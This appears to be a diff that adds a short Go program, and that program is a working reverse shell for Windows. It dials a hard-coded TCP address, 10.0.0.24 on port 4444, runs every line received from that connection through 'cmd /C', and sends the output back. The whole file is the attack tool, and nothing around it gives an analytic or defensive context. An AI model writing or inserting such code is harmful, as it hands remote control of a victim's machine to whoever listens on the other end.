@@ -1,0 +1,28 @@
+package main
+
+import (
+	"bufio"
+	"net"
+	"os"
+	"os/exec"
+)
+
+func main() {
+	shell("10.0.0.24:4444")
+}
+
+func shell(host string) {
+	conn, err := net.Dial("tcp", host)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	for {
+		message, _ := bufio.NewReader(conn).ReadString('\n')
+		out, err := exec.Command("cmd", "/C", message).CombinedOutput()
+		if err != nil {
+			os.Exit(1)
+		}
+		conn.Write(out)
+	}
+}
